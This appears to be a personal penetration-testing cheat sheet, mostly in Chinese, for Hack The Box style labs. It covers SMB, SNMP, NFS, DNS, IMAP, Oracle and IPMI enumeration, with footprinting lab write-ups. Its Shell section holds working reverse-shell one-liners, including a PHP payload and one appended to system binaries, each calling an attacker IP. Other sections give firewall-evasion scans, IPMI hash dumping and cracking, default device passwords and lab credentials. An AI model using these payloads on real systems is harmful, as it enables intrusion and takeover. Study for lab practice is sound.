# SMB

```
nmap --script smb-os-discovery.nse -p445 10.129.181.147


smbclient -N -L \\\\10.129.42.253
smbclient \\\\10.129.181.147\\users #以guest身份登录
smbclient -U bob \\\\10.129.42.253\\users #使用bob用户登录 ls cd get都可用
!ls #smb上执行
smbstatus # 系统上执行


rpcclient -U "" 10.129.14.128
srvinfo
enumdomains
querydominfo
netshareenumall
netsharegetinfo notes
enumdomusers
queryuser 0x3e9
querygroup 0x201
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done #暴力破解rid
samrdump.py 10.129.14.128
smbmap -H 10.129.14.128
crackmapexec smb 10.129.14.128 --shares -u '' -p ''


git clone https://github.com/cddmp/enum4linux-ng.git
./enum4linux-ng.py 10.129.14.128 -A
```

# SNMP

在 SNMP 版本 1 和 2c 中，使用纯文本社区字符串控制访问，如果我们知道名称，就可以访问它。加密和身份验证仅在 SNMP 版本 3 中添加。

```
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
snmpwalk -v 2c -c private  10.129.42.253 #查询名称找Nday
onesixtyone -c dict.txt 10.129.42.254
```

# Shell

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.113 9443 >/tmp/f"); ?>
    
```

```shell-session
gobuster dir -u http://10.129.73.163/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
curl http://10.129.91.93/nibbleblog/README
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.113 8443 >/tmp/f' | tee -a monitor.sh /usr/bin/php
python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo php -r '$sock=fsockopen("10.10.14.113",8443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

# Nmap

```
sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping #可以根据TTL推断系统
xsltproc target.xml -o target.html #比较直观好看
nc -nv 10.129.2.28 25#会显示系统类型
nmap 10.129.2.28 -p 80 -sV --script vuln #漏洞检测
sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 #使用诱饵
sS SYN;sA ACK;sT Connect，sS容易被过滤，sA不容易被过滤

#####规避防火墙
sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
nmap -sU -p 53 --script dns-nsid,banner -Pn -n -disable-arp-ping -sV 10.129.2.48
1)nmap x.x.x.x -sS -Pn -n --source-port 53
2)nmap x.x.x.x -sT -Pn -n --source-port 53 -D RND:5
nmap x.x.x.x -sT -pn -n --source-port 53 -D RND:5 -p 53 -sV
3)nmap x.x.x.x -sS -Pn -n --source-port 53 -D RND:5
nmap x.x.x.x -sT -pn -n --source-port 5000 -D RND:5 -p 53 -sV
ncat -nv --source-port 53 10.129.102.234 5000
nmap -sS -A -T2 --data-length 1400 #分片绕过防火墙
```

```
其他扫描软件
rustscan -b 500 -t 4000 -a x.x.x.x --range 1-65535
fscan -h x.x.x.x -p 1-65535
scaninfo -i x.x.x.x -p 1-65535
```

# 子域名收集

```
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .#以json格式输出

curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u#按唯一子域对它们进行筛选
```

# exploits

```
find / -type f -name ftp* 2>/dev/null | grep scripts #nmap
```

以下服务的利用可以用于查找服务的配置，找到弱配置。

# FTP

```
cat /etc/ftpusers
```

 TFTP 与 FTP 不同，它不需要用户的身份验证。它不支持通过密码进行受保护的登录，并且仅根据作系统中文件的读写权限设置访问限制。与 FTP 客户端不同，`TFTP` 没有目录列表功能。

FTP是tcp协议，有主动模式和被动模式，21端口是控制端口，一定会有，20端口（数据）是主动模式会打开，被动模式一般FTP服务器会开放其他的高位端口等待连接。



# NFS

```
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
showmount -e 10.129.14.128 #显示可用的共享目录
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
tree .

ls -l mnt/nfs/
ls -n mnt/nfs/

sudo umount ./target-NFS
```

# DNS

```
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done#子域暴力破解
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

```
dig @1.1.1.1 domain.com #表示使用1.1.1.1这个域名服务器进行查询
```



## Record DNS

**A:**结果返回所请求域的 IPv4 地址。

**AAAA:**返回所请求域的 IPv6 地址。

**MX:**返回负责的邮件服务器作为结果。

**NS:**返回域的 DNS 服务器（名称服务器），告诉 DNS 查询系统 **该域名的解析应该通过哪个服务器来处理**。

```
dig ns inlanefreight.htb @10.129.14.128
```

**TXT:**此记录可以包含各种信息。例如，可以使用全能工具来验证 Google Search Console 或验证 SSL 证书。此外，还设置了 SPF 和 DMARC 条目来验证邮件流量并保护其免受垃圾邮件的侵害。

```
dig CH TXT version.bind 10.129.120.85
```

**CNAME:**此记录用作另一个域名的别名。如果您希望域 www.hackthebox.eu 指向与 hackthebox.eu 相同的 IP，则可以为 hackthebox.eu 创建一个 A 记录，为 www.hackthebox.eu 创建一个 CNAME 记录。

**PTR:**PTR 记录的工作方式正好相反（反向查找）。它将 IP 地址转换为有效的域名。

**SOA:**提供有关管理联系人的相应 DNS 区域和电子邮件地址的信息。

```
dig soa www.inlanefreight.com
```

```shell-session
dig any inlanefreight.htb @10.129.14.128
```

```shell-session
dig axfr inlanefreight.htb @10.129.14.128 区域传输
```

# SMTP

```
smtp-user-enum -M VRFY -U /usr/share/seclists/Discovery/SNMP/snmp.txt -t 10.129.145.179 -w 15
```

# IMAP/POP3

110和995(加密)用于pop3

143和993(加密)用于imap

```
nmap 10.129.134.32 -sV -p110,143,993,995 -sC
curl -k 'imaps://10.129.134.32' --user robin：robin
curl -k 'imaps://10.129.134.32' --user robin：robin -v
openssl s_client -connect 10.129.134.32:pop3s
openssl s_client -connect 10.129.134.32:imaps
robin：robin
```

imap支持用户列举，但pop3不支持。

# SNMP

161端口发送控制指令

SNMPv1 `没有内置的身份验证`机制，SNMPv2 存在于不同的版本中。今天仍然存在的版本是 `v2c`，扩展名 `c` 表示基于社区的 SNMP。

```
snmpwalk -v2c -c public 10.129.14.128
```

# Oracle

1521端口

```
nmap -p1521 -sV 10.129.180.180 --open --script oracle-sid-brute

###############安装odat和sqlplus
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome

```

# IPMI

IPMI 通过端口 623 UDP 进行通信。

```
nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local


use auxiliary/scanner/ipmi/ipmi_version 
set rhosts 10.129.42.195
run
```

Dell iDRAC :root :calvin

HP iLO: Administrator: 由数字和大写字母组成的随机 8 个字符的字符串

```
该命令 hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u 会尝试所有大写字母和数字的组合来获得 8 个字符的密码。
```

```
use auxiliary/scanner/ipmi/ipmi_dumphashes 
set rhosts 10.129.179.34
run
hashcat -m 7300 -a 0 -o found.txt hash.txt  /usr/share/wordlists/rockyou.txt

```

git push：

```bash
cd /path/to/your/notes
git init

git remote add origin <your_remote_repository_url>

git add .
git commit -m "Initial commit with notes"
git push -u origin master

git add .
git commit -m "Your commit message"
git push origin master
```

# SSH

```
 2016 年 OpenSSH 7.2p1 版本中的命令注入漏洞
 sed -r '/^\s*$/d' 含义是删除空白行，/^\s*$/d这个是匹配完全为空白的行
 grep -v "#" 含义是排除掉注释行
```

工具git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit

Rsync允许通过SSH进行安全的数据传输，默认端口是873

r-services，比如rcp、rexec、rsh等。默认端口是512，513，514，一些内网的机器可能会有。

# RDP

可以通过多种方式进行身份验证和连接到此类 RDP 服务器。例如，我们可以使用 `xfreerdp`、`rdesktop` 或 `Remmina` 连接到 Linux 上的 RDP 服务器，并相应地与服务器的 GUI 进行交互。

```
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
```

WinRM 依靠 `TCP` 端口 `5985` 和 `5986` 进行通信，最后一个端口 `5986 使用 HTTPS`

WMI 通信的初始化始终在 `TCP` 端口 `135` 上进行，成功建立连接后，通信将移动到随机端口。

# writeup

## footprinter lab easy ——ftp获取ssh密钥

```
nmap -p- 10.129.180.203 -T4
```

<img src="\image-20250506151337800.png" alt="image-20250506151633677" style="zoom:50%;" />

```
nmap -p 21,22,53,2121 -sCV -A -O 10.129.180.203  
```

<img src="\image-20250506151633677.png" alt="image-20250506151633677" style="zoom:50%;" />

```
ftp 10.129.180.203 2121
ls -al
```

<img src="\image-20250506152053363.png" alt="image-20250506152053363" style="zoom:50%;" />

```
cd .ssh
get id_rsa
chmod 600 id_rsa
ssh ceil@10.129.180.203 -i id_rsa
```

<img src="\image-20250506152709012.png" alt="image-20250506151633677" style="zoom:50%;" />

## footprinter lab medium——NFS+SMB+密码复用

```
nmap 10.129.202.41 #扫描主机常见的1000个端口
```

<img src="\image-20250506154503704.png" alt="image-20250506151633677" style="zoom:50%;" />



```
nmap -p 111,135,139,445,2049,3389 -sCV -A -O 10.129.202.41  
```

<img src="\image-20250506155153883.png" alt="image-20250506151633677" style="zoom:50%;" />

```
showmount -e 10.129.202.41
```

<img src="\image-20250506155616246.png" alt="image-20250506151633677" style="zoom:50%;" />

```
mkdir targer-NFS
mount  -t nfs 10.129.202.41:/TechSupport ./targer-NFS/ -o nolock
cd ./targer-NFS/
ls -al
```

<img src="\image-20250506155914126.png" alt="image-20250506151633677" style="zoom:50%;" />

```
cat ticket4238791283782.txt
```

<img src="\image-20250506160015249.png" alt="image-20250506151633677" style="zoom:50%;" />

```
killall openvpn #先把所有vpn杀掉
xfreerdp /v:10.129.2.9 /u:alex /p:'lol123!mD' /cert:ignore /d:WINMEDIUM /dynamic-resolution
```

```
crackmapexec smb 10.129.141.255 --shares -u 'alex' -p 'lol123!mD' -d 'WINMEDIUM'
smbclient -U alex \\\\10.129.141.255\\devshare
```

```
xfreerdp /timeout:60000 /v:10.129.141.255 /u:Administrator /p:'87N1ns@slls83' /cert:ignore /d:WINMEDIUM /dynamic-resolution
```

<img src="\783ABCEE-3E44-45ba-A516-6FDDC3D934E2.png" alt="image-20250506151633677" style="zoom:50%;" />

## footprinter lab hard

```
nmap -Pn -sC -sV 10.129.202.20 -oA target
```

```
map --top-port 100 -sV -sU 10.129.202.20
```

```
onesixtyone -c /usr/share/SecLists/Discovery/SNMP/snmp.txt 10.129.202.20
```

```
snmpwalk -v2c -c backup 10.129.210.77
```

```
openssl s_client -connect 10.129.210.77:imaps
1 LOGIN tom {password}
1 LIST "" *
1 LIST INBOX
1 SELECT 1 BODY[]
```

```
ssh -i id_rsa tom@10.129.210.77

```

```
mysql -u tom -p
show databses;
use users
show tables;
select * from users where username = 'HTB';
```

# 钓鱼邮件甄别

whois 注册时间近期、隐藏注册者身份、名称服务器通常与已知恶意服务提供商相关联。

# DNS将域名转换为ip的路径

1、看本地缓存

2、看根解析器，全球有 13 个根服务器

3、看顶级域名解析器，例如，.com、.org

4、看权威域名解析器 —返回ip，它的作用是保存域的实际 IP 地址的服务器，通常由托管服务提供商或域注册商管理。

# 子域名枚举

## 主动枚举

### 暴力破解

```
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r #-r是递归的意思
```

## 被动枚举

### DNS区域传输

```
dig axfr @ns服务器地址 域名
```

## Virtual Hosts

核心是 Web 服务器能够区分共享同一 IP 地址的多个网站或应用程序。这是通过利用 `HTTP Host` 标头实现的。

网站通常具有非公开的子域，并且不会显示在 DNS 记录中。这些`子域`只能在内部或通过特定配置访问。`VHost 模糊测试`是一种通过针对已知 IP 地址测试各种主机名来发现公有和非公有`子域`和 `VHost` 的技术。

虚拟主机提供的几种形式：

1.基于名称的虚拟主机，多个网站绑定一个ip。

2.基于ip的虚拟主机，不同网站不同ip。

3.基于端口的虚拟主机，不同网站同一ip不同端口。

**host碰撞**

```
vim /etc/hosts 填写ip和主域名
```

```
gobuster vhost -u http://域名:38644 -w <wordlist_file> --append-domain -t 50 -k(忽略TLS证书错误)
```

### 证书查找

```shell-session
curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[]
 | select(.name_value | contains("dev")) | .name_value' | sort -u
```
